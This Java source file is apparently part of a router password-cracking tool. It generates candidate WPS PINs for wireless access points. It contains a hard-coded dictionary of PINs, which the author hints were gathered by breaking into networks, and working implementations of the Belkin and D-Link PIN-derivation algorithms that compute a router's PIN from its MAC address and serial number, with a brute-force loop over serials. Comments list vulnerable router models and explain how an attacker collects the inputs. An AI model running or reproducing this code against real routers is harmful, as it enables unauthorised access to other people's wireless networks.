package com.glezo.routerPasswordEngine;

import java.util.ArrayList;

import com.glezo.mac.Mac;
import com.glezo.passwordDictionary.PasswordDictionary;

public class WPS_password_engine 
{
	//-----------------------------------------------------------------------------------------------------------
	private static int wps_checksum(int pin)
	{
		/* Generates a standard WPS checksum from a 7 digit pin */
		int div = 0;
		while(pin>0)
		{
			div += 3 * (pin % 10);
			pin /= 10;
			div += pin % 10;
			pin /= 10;
		}
		return ((10 - div % 10) % 10);		
	}
	//-----------------------------------------------------------------------------------------------------------
	//-----------------------------------------------------------------------------------------------------------
	//-----------------------------------------------------------------------------------------------------------
	public static PasswordDictionary		empirical_ish()
	{
		ArrayList<String> words=new ArrayList<String>();

		//empirically tested wps by myself. If u know what i mean... (order is relevant here)
    //and  dumpper database, where order is not relevant
		words.add("16495265");
		words.add("94862423");
		words.add("18001907");
		words.add("15584151");
		words.add("88478760");
		words.add("31441889");
		words.add("77828491");
		words.add("00779876");
		words.add("38163289");
		words.add("47148826");
		words.add("64630113");
		words.add("17342711");
		words.add("78551312");
		words.add("25905892");
		words.add("24100489");
		words.add("17623964");
		words.add("86075923");
		words.add("11161189");
		words.add("92537309");
		words.add("42497868");
		words.add("14145629");
		words.add("18916157");
		words.add("15116574");
		words.add("71331591");
		words.add("12749355");
		words.add("88202907");
		words.add("14058400");
		words.add("13849238");
		words.add("21158766");
		words.add("16259553");
		words.add("11915140");
		words.add("97332152");
		
		//dumpper database
		words.add("12345670");							
		words.add("11866428");							
		words.add("18836486");							
		words.add("20329761");							
		words.add("71537573");							
		words.add("54768642");							
		words.add("13409708");	
		words.add("16538061");	
		words.add("16702738");	
		words.add("18355604");	
		words.add("19756967");	
		words.add("43297917");	
		words.add("73767053");	
		words.add("77775078");	
		words.add("51340865");	
		words.add("21143892");				
		words.add("10009321");	
		words.add("31348034");	
		words.add("18794786");	
		words.add("15738370");			
		words.add("95755212");	
		words.add("64874487");	
		words.add("58945537");	
		words.add("79082020");				
		words.add("19117652");	
		words.add("16035232");	
		words.add("20172527");	
		words.add("49385052");				

		return new PasswordDictionary("empirical-ish",words,"");
	}
	//-----------------------------------------------------------------------------------------------------------
	public static PasswordDictionary		belkin_wps(Mac bssid,String serial)
	{
		//http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/
		/*
		Confirmed vulnerable:
			F9K1001v4
			F9K1001v5
			F9K1002v1
			F9K1002v2
			F9K1002v5
			F9K1103v1
			F9K1112v1
			F9K1113v1
			F9K1105v1
			F6D4230-4v2
			F6D4230-4v3
			F7D2301v1
			F7D1301v1
			F5D7234-4v3
			F5D7234-4v4
			F5D7234-4v5
			F5D8233-4v1
			F5D8233-4v3
			F5D9231-4v1
		Confirmed not vulnerable:
			F9K1001v1
			F9K1105v2
			F6D4230-4v1
			F5D9231-4v2
			F5D8233-4v4
		Since WiFi probe request/response packets are not encrypted, an attacker can gather the MAC address (the MAC address used by the algorithm is the LAN MAC) 
		and serial number of a target by sending a single probe request packet to a victim access point.		
		*/
		ArrayList<String> result=new ArrayList<String>();
		
		String mac=bssid.get_mac("",true);
		/* Munges the MAC and serial numbers to create a WPS pin */
		int NIC_NIBBLE_0    =0;
		int NIC_NIBBLE_1    =1;
		int NIC_NIBBLE_2    =2;
		int NIC_NIBBLE_3    =3;
		 
		int SN_DIGIT_0      =0;
		int SN_DIGIT_1      =1;
		int SN_DIGIT_2      =2;
		int SN_DIGIT_3      =3;
		 
		int sn[]=new int[4]; int nic[]=new int[4];
		int mac_len, serial_len;
		int k1, k2, pin;
		int p1, p2, p3;
		int t1, t2;
		 
		 
		/* Get the four least significant nibbles of the MAC address */
		mac_len = mac.length();
		nic[NIC_NIBBLE_0]	= Integer.parseInt(Character.toString(mac.charAt(mac_len-1)),16);
		nic[NIC_NIBBLE_1]	= Integer.parseInt(Character.toString(mac.charAt(mac_len-2)),16);
		nic[NIC_NIBBLE_2]	= Integer.parseInt(Character.toString(mac.charAt(mac_len-3)),16);
		nic[NIC_NIBBLE_3]	= Integer.parseInt(Character.toString(mac.charAt(mac_len-4)),16);

		String notes="";
		if(serial!=null)
		{
			notes="generated with serial "+serial;
			/* Get the four least significant digits of the serial number */
			serial_len = serial.length();
			sn[SN_DIGIT_0]		= Integer.parseInt(Character.toString(serial.charAt(serial_len-1)),16);
			sn[SN_DIGIT_1]		= Integer.parseInt(Character.toString(serial.charAt(serial_len-2)),16);
			sn[SN_DIGIT_2]		= Integer.parseInt(Character.toString(serial.charAt(serial_len-3)),16);
			sn[SN_DIGIT_3]		= Integer.parseInt(Character.toString(serial.charAt(serial_len-4)),16);
			
			 
			k1 =(	sn[SN_DIGIT_2] +
					sn[SN_DIGIT_3] +
					nic[NIC_NIBBLE_0] +
					nic[NIC_NIBBLE_1]) % 16;
			 
			k2 = (	sn[SN_DIGIT_0] +
					sn[SN_DIGIT_1] +
					nic[NIC_NIBBLE_3] +
					nic[NIC_NIBBLE_2]) % 16;
			 
			pin = k1 ^ sn[SN_DIGIT_1];
			     
			t1 = k1 ^ sn[SN_DIGIT_0];
			t2 = k2 ^ nic[NIC_NIBBLE_1];
			     
			p1 = nic[NIC_NIBBLE_0] ^ sn[SN_DIGIT_1] ^ t1;
			p2 = k2 ^ nic[NIC_NIBBLE_0] ^ t2;
			p3 = k1 ^ sn[SN_DIGIT_2] ^ k2 ^ nic[NIC_NIBBLE_2];
			     
			k1 = k1 ^ k2;
			 
			pin = (pin ^ k1) * 16;
			pin = (pin + t1) * 16;
			pin = (pin + p1) * 16;
			pin = (pin + t2) * 16;
			pin = (pin + p2) * 16;
			pin = (pin + k1) * 16;
			pin += p3;
			pin = (pin % 10000000) - (((pin % 10000000) / 10000000) * k1);


			result.add(Integer.toString(((pin * 10) + wps_checksum(pin))));
		}
		else
		{
			notes="bruteforced serial";
			for(int i=0;i<=9999;i++)
			{
				String current_serial=String.format("%04d",i);
				
				sn[SN_DIGIT_0]		= Integer.parseInt(Character.toString(current_serial.charAt(0)),16);
				sn[SN_DIGIT_1]		= Integer.parseInt(Character.toString(current_serial.charAt(1)),16);
				sn[SN_DIGIT_2]		= Integer.parseInt(Character.toString(current_serial.charAt(2)),16);
				sn[SN_DIGIT_3]		= Integer.parseInt(Character.toString(current_serial.charAt(3)),16);
				
				 
				k1 =(	sn[SN_DIGIT_2] +
						sn[SN_DIGIT_3] +
						nic[NIC_NIBBLE_0] +
						nic[NIC_NIBBLE_1]) % 16;
				 
				k2 = (	sn[SN_DIGIT_0] +
						sn[SN_DIGIT_1] +
						nic[NIC_NIBBLE_3] +
						nic[NIC_NIBBLE_2]) % 16;
				 
				pin = k1 ^ sn[SN_DIGIT_1];
				     
				t1 = k1 ^ sn[SN_DIGIT_0];
				t2 = k2 ^ nic[NIC_NIBBLE_1];
				     
				p1 = nic[NIC_NIBBLE_0] ^ sn[SN_DIGIT_1] ^ t1;
				p2 = k2 ^ nic[NIC_NIBBLE_0] ^ t2;
				p3 = k1 ^ sn[SN_DIGIT_2] ^ k2 ^ nic[NIC_NIBBLE_2];
				     
				k1 = k1 ^ k2;
				 
				pin = (pin ^ k1) * 16;
				pin = (pin + t1) * 16;
				pin = (pin + p1) * 16;
				pin = (pin + t2) * 16;
				pin = (pin + p2) * 16;
				pin = (pin + k1) * 16;
				pin += p3;
				pin = (pin % 10000000) - (((pin % 10000000) / 10000000) * k1);

				String current_wps_password=Integer.toString(((pin * 10) + wps_checksum(pin)));
				if(!result.contains(current_wps_password))
				{
					result.add(current_wps_password);	
				}
			}
		}
		return new PasswordDictionary("belkin_wps",result,notes);
	}
	//-----------------------------------------------------------------------------------------------------------
	public static PasswordDictionary		dlink_wps(Mac bssid)
	{
		//http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/

		ArrayList<String> result=new ArrayList<String>();

		String mac=bssid.get_mac("",true);
		//int wifi_mac_as_int	=Integer.parseInt(mac.replace(":",""),16);
		//int wan_mac_as_int	=Integer.parseInt(mac.replace(":",""),16)+1;
		int nic				=Integer.parseInt(mac.replace(":","").substring(6),16)+1;
		
		/* Do some XOR munging of the NIC. */
		int pin = (nic ^ 0x55AA55);
		pin = pin ^ (((pin & 0x0F) << 4) +
				((pin & 0x0F) << 8) +
				((pin & 0x0F) << 12) +
				((pin & 0x0F) << 16) +
				((pin & 0x0F) << 20));
		  
		/*
		 * The largest possible remainder for any value divided by 10,000,000
		 * is 9,999,999 (7 digits). The smallest possible remainder is, obviously, 0.
		 */
		pin = pin % 10000000;
		  
		/* The pin needs to be at least 7 digits long */
		if(pin < 1000000)
		{
			/*
			 * The largest possible remainder for any value divided by 9 is
			 * 8; hence this adds at most 9,000,000 to the pin value, and at
			 * least 1,000,000. This guarantees that the pin will be 7 digits
			 * long, and also means that it won't start with a 0.
			 */
			pin += ((pin % 9) * 1000000) + 1000000;
		}
		  
		/*
		 * The final 8 digit pin is the 7 digit value just computed, plus a
		 * checksum digit. Note that in the disassembly, the wps_pin_checksum
		 * function is inlined (it's just the standard WPS checksum implementation).
		 */
		result.add(Integer.toString(((pin * 10) + wps_checksum(pin))));
		
		return new PasswordDictionary("dlink_wps",result,"");
	}
	//-----------------------------------------------------------------------------------------------------------
}
